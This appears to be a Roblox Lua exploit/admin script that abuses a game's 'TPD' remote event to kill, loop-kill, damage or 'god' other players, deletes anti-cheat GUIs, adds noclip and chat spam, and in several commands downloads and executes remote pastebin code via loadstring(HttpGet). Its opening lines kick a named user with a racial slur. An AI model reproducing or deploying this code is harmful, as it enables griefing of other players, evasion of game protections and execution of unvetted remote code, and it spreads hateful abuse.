if game.Players.LocalPlayer.Name == "GavWallin" then
game.Players.LocalPlayer:Kick("BLACKLISTED NIGGER GET BUTTFUCKED HOE SKID UGLY")
end
print("E")

local AdminChecked = _G.Admin

AdminChecked = true

local gPlayers = game:GetService("Players")
local admin = game.Players.LocalPlayer.Name

local admins = {"Friend, Friend"}

local services = {}
local cmds = {}
local std = {}

local serverLocked = false

function FIX_LIGHTING()
    game.Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
    game.Lighting.Brightness = 1
    game.Lighting.GlobalShadows = true
    game.Lighting.Outlines = false
    game.Lighting.TimeOfDay = 14
    game.Lighting.FogEnd = 100000
	end

	services.players = gPlayers
	services.lighting = game:GetService("Lighting")
	services.workspace = game:GetService("Workspace")
	services.events = {}
	local user = gPlayers.LocalPlayer
	
	local tprefix = "-"
	local scriptprefix = "/"
	local split = " "

	for i, v in pairs(game.CoreGui:GetDescendants()) do
	    if v:IsA("TextLabel") and v.Text == "Toxicity" then
	        print(v:GetFullName())
	    end
	end
	
	local updateevents = function()
	    for i, v in pairs(services.events) do
	        services.events:remove(i)
	        v:disconnect()
	    end
	    for i, v in pairs(gPlayers:players()) do
	        local ev =
	            v.Chatted:connect(
	            function(msg)
	                do_exec(msg, v)
	            end
	        )
	        services.events[#services.events + 1] = ev
	    end
	end

	std.inTable = function(tbl, val)
	    if tbl == nil then
	        return false
	    end
	
	    for _, v in pairs(tbl) do
	        if v == val then
	            return true
	        end
	    end
	    return false
	end
	
	std.out = function(str)
	    print(str)
	end
	
	std.list = function(tbl)
	    local str = ""
	    for i, v in pairs(tbl) do
	        str = str .. tostring(v)
	        if i ~= #tbl then
	            str = str .. ", "
	        end
	    end
	    return str
	end
	
	std.endat = function(str, val)
	    local z = str:find(val)
	    if z then
	        return str:sub(0, z - string.len(val)), true
	    else
	        return str, false
	    end
	end
	
	std.first = function(str)
	    return str:sub(1, 1)
	end
	
	local isAdmin = function(name)
	    if name == admin then
	        return true
	    elseif admins[name] == true then
	        return true
	    end
	    return false
	end
	
	local exec = function(str)
	    spawn(
	        function()
	            local script, loaderr = loadstring(str)
	            if not script then
	                error(loaderr)
	            else
	                script()
	            end
	        end
	    )
	end
	
	local findCmd = function(cmd_name)
	    for i, v in pairs(cmds) do
	        if v.NAME:lower() == cmd_name:lower() or std.inTable(v.ALIAS, cmd_name:lower()) then
	            return v
	        end
	    end
	end
	
	local getCmd = function(msg)
	    local cmd, hassplit = std.endat(msg:lower(), split)
	    if hassplit then
	        return {cmd, true}
	    else
	        return {cmd, false}
	    end
	end
	
	local getprfx = function(strn)
	    if strn:sub(1, string.len(tprefix)) == tprefix then
	        return {"cmd", string.len(tprefix) + 1}
	    elseif strn:sub(1, string.len(scriptprefix)) == scriptprefix then
	        return {"exec", string.len(scriptprefix) + 1}
	    end
	    return
	end
	
	local getArgs = function(str)
	    local args = {}
	    local new_arg = nil
	    local hassplit = nil
	    local s = str
	    repeat
	        new_arg, hassplit = std.endat(s:lower(), split)
	        if new_arg ~= "" then
	            args[#args + 1] = new_arg
	            s = s:sub(string.len(new_arg) + string.len(split) + 1)
	        end
	    until hassplit == false
	    return args
	end
	
	local function execCmd(str, plr)
	    local s_cmd
	    local a
	    local cmd
	    s_cmd = getCmd(str) --separate command from string using split {command name,arg bool (for arg system)}
	    cmd = findCmd(s_cmd[1]) --get command object {NAME,DESC,{ALIASES},function(args)}
	    if cmd == nil then
	        return
	    end
	    a = str:sub(string.len(s_cmd[1]) + string.len(split) + 1)
	     --start string "a" after command and split
	    local args = getArgs(a)
	     --gets us a nice table of arguments
	
	    pcall(
	        function()
	            cmd.FUNC(args, plr)
	        end
	    )
	end
	
	function do_exec(str, plr)
	    if not isAdmin(plr.Name) then
	        return
	    end
	
	    str = str:gsub("/e ", "") --remove "/e " the easy way!
	
	    local t = getprfx(str)
	    if t == nil then
	        return
	    end
	    str = str:sub(t[2])
	    if t[1] == "exec" then
	        exec(str)
	    elseif t[1] == "cmd" then
	        execCmd(str, plr)
	    end
	end
	
	updateevents()
_G.exec_cmd = execCmd
	--game.Players.LocalPlayer.Chatted:connect(doexec)
	
	local _char = function(plr_name)
	    for i, v in pairs(game.Players:GetChildren()) do
	        if v:IsA "Player" then
	            if v.Name == plr_name then
	                return v.Character
	            end
	        end
	    end
	    return
	end
	
	local _plr = function(plr_name)
	    for i, v in pairs(game.Players:GetChildren()) do
	        if v:IsA "Player" then
	            if v.Name == plr_name then
	                return v
	            end
	        end
	    end
	    return
	end
	
	function addcmd(name, desc, alias, func)
	    cmds[#cmds + 1] = {
	        NAME = name,
	        DESC = desc,
	        ALIAS = alias,
	        FUNC = func
	    }
	end
	
	local function getPlayer(name)
	    local nameTable = {}
	    name = name:lower()
	    if name == "me" then
	        return {admin}
	    elseif name == "others" then
	        for i, v in pairs(gPlayers:GetChildren()) do
	            if v:IsA "Player" then
	                if v.Name ~= admin then
	                    nameTable[#nameTable + 1] = v.Name
	                end
	            end
	        end
	    elseif name == "all" then
	        for i, v in pairs(gPlayers:GetChildren()) do
	            if v:IsA "Player" then
	                nameTable[#nameTable + 1] = v.Name
	            end
	        end
	    else
	        for i, v in pairs(gPlayers:GetChildren()) do
	            local lname = v.Name:lower()
	            local i, j = lname:find(name)
	            if i == 1 then
	                return {v.Name}
	            end
	        end
	    end
	    return nameTable
	end
local a =
	setmetatable(
	    {},
	    {__index = function(b, c)
	            return game:service(c)
	        end}
	)
local d = {"AntiSpeedHack", "AntiDataTheft", "UI", "NO FF"}
local e = a.Players.LocalPlayer
local f = {}
function NoAnti()
    spawn(
        function()
            a.RunService.RenderStepped:wait()
            for g, h in pairs(f) do
                h:remove()
                f[g] = nil
            end
            for g, h in pairs(e.PlayerGui:GetChildren()) do
                for g, b in pairs(d) do
                    if b == h.Name then
                        h:remove()
                    end
                end
            end
        end
    )
end
NoAnti()

addcmd(
    "god",
    "gods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        NoAnti()
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("god") then
                gPlayers[v]:FindFirstChild("god"):Destroy()
            end
            local god = Instance.new("BoolValue")
            god.Parent = gPlayers[v]
            god.Value = true
            god.Name = "god"

            game:GetService("RunService").RenderStepped:connect(
                function()
                    if gPlayers[v]:FindFirstChild("god") then
                        game.ReplicatedStorage.Event:FireServer(
                            "TPD",
                            -math.huge ^ 1.45,
                            gPlayers[v].Character:FindFirstChild("Humanoid")
                        )
                        game.ReplicatedStorage.Event:FireServer(
                            "TPD",
                            math.huge,
                            gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
                                gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
                        )
                    end
                end
            )
        end
    end
)

addcmd(
    "ung",
    "ungods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("god") then
                gPlayers[v]:FindFirstChild("god"):Destroy()
game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
            end
        end
    end
)

addcmd(
    "loopg",
    "loopgods the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        NoAnti()
        for i, v in pairs(players) do
            game:GetService("RunService").RenderStepped:connect(
                function()
				game.RunService.Stepped:wait()
                    game.ReplicatedStorage.Event:FireServer(
                        "TPD",
                        -math.huge ^ 1.45,
                        gPlayers[v].Character:FindFirstChild("Humanoid")
                    )
                    game.ReplicatedStorage.Event:FireServer(
                        "TPD",
                        math.huge,
                        gPlayers[v].Character and gPlayers[v].Character:FindFirstChild "Humanoid" or
                            gPlayers[v].CharacterAdded:wait():FindFirstChild("Humanoid")
                    )
                end
            )
        end
    end
)

addcmd(
    "play",
    "plays a id from the chosen player boombox",
    {},
    function(args)
        local players = getPlayer(args[1])
        if not args[1] or not args[2] then
            return
        end
        local num = args[2]
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("PlayRadio", gPlayers[v], num)
        end
    end
)

addcmd(
    "to",
    "teleports you to the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        if players ~= nil and _char(players[1]):FindFirstChild("HumanoidRootPart") then
            _char(admin).HumanoidRootPart.CFrame = _char(players[1]).HumanoidRootPart.CFrame
        end
    end
)

addcmd(
    "kill",
    "destroys the breakjoins of the chosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", math.huge, gPlayers[v].Character.Humanoid)
        end
    end
)

addcmd(
    "dmg",
    "destroys the # of the amount that the player typed",
    {},
    function(args)
        local players = getPlayer(args[1])
        if not args[1] or not args[2] then
            return
        end
        local num = args[2]
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", num, gPlayers[v].Character.Humanoid)
        end
    end
)

addcmd(
    "reg",
    "gives back num% of the of the damaged health from the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
      	if not args[1] or not args[2] then
            return
        end
        local num = args[2]
			NoAnti()
        for i, v in pairs(players) do
            game.ReplicatedStorage.Event:FireServer("TPD", -num, gPlayers[v].Character.Humanoid)
        end
    end
)


addcmd(
    "watch",
    "view's the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        workspace.CurrentCamera.CameraSubject = game.Players[players[1]].Character
    end
)

addcmd(
    "loopk",
    "requires at least lower then 100 ping or below",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("fasterloop") then
                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
            end
            local fasterloop = Instance.new("BoolValue")
            fasterloop.Parent = gPlayers[v]
            fasterloop.Value = true
            fasterloop.Name = "fasterloop"
            game:GetService("RunService").RenderStepped:connect(
                function()
				game.RunService.Stepped:wait()
                    if gPlayers[v]:FindFirstChild("fasterloop") then
                        local s =
                            game:GetService("Players"):FindFirstChild(gPlayers[v].Name).Character:FindFirstChild(
                            "Humanoid"
                        )
                        game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
                    end
                end
            )
        end
    end
)
addcmd(
    "unlk",
    "unloops the choosen player",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            if gPlayers[v]:FindFirstChild("fasterloop") then
                gPlayers[v]:FindFirstChild("fasterloop"):Destroy()
            end
        end
    end
)


addcmd(
    "glk",
    "loopkills the choosen person",
    {},
    function(args)
        local players = getPlayer(args[1])
        for i, v in pairs(players) do
            game:GetService("RunService").RenderStepped:connect(
                function()
				game.RunService.Stepped:wait()
                    local s =
                        game:GetService("Players"):WaitForChild(gPlayers[v].Name).Character:FindFirstChild("Humanoid")
                    game.ReplicatedStorage.Event:FireServer("TPD", math.huge, s)
                end
            )
        end
    end
)

addcmd(
    "rej",
    "makes the localplayer rejoin hopefully quicker",
    {},
    function(args)
        game:GetService("TeleportService"):Teleport(game.PlaceId)
    end
)

	
addcmd(
    "rst",
    "kills the localplayer even through if you're still goded",
    {},
    function(args)
        game.Players.LocalPlayer.Character:BreakJoints()
    end
)

addcmd(
    "slock",
    "enables shiftlock",
    {},
    function(args)
        game.Players.LocalPlayer.DevEnableMouseLock = true
    end
)

local Player = game.Players.LocalPlayer
Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "nc") then
            local function noclip(plr)
                local admintag = Instance.new("BoolValue")
                admintag.Parent = game.Players[plr]
                admintag.Value = true
                admintag.Name = "noclip"
            end
            if game.Players.LocalPlayer:FindFirstChild("noclip") then
                game.Players.LocalPlayer.noclip:Destroy()
            end
            noclip(game.Players.LocalPlayer.Name)
            game:GetService("RunService").Stepped:connect(
                function()
                    if game.Players.LocalPlayer:FindFirstChild("noclip") then
                        game.Players.LocalPlayer.Character.Head.CanCollide = false
                        game.Players.LocalPlayer.Character.Torso.CanCollide = false
                    end
                end
            )
        end
    end
)

Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "clip") then
            game.Players.LocalPlayer.noclip:Destroy()
        end
    end
)


Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "kgui") then
            

           loadstring(game:HttpGet('https://pastebin.com/raw/VzmbXzAc', true))()


        end
    end
)




Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "cc") then
    for i=1,20 do
game.Players:Chat([[                            '








































]])
end

        end
    end
)








Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "roles") then
            

           loadstring(game:HttpGet('https://pastebin.com/raw/52jxivQr', true))()


        end
    end
)


Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "eqall") then
            
            for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
         tool.Parent = game:GetService("Players").LocalPlayer.Character -- I didn't use Equip because the Equip function unequips any other tools in your character.
    end
end

        end
    end
)






Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "agui") then
            

           loadstring(game:HttpGet('https://pastebin.com/raw/uyzCgitP', true))()


        end
    end
)

Player.Chatted:connect(
    function(cht)
        if cht:match(tprefix .. "cmds") then
            

           loadstring(game:HttpGet('https://pastebin.com/raw/JNE4WEXY', true))()


        end
    end
)
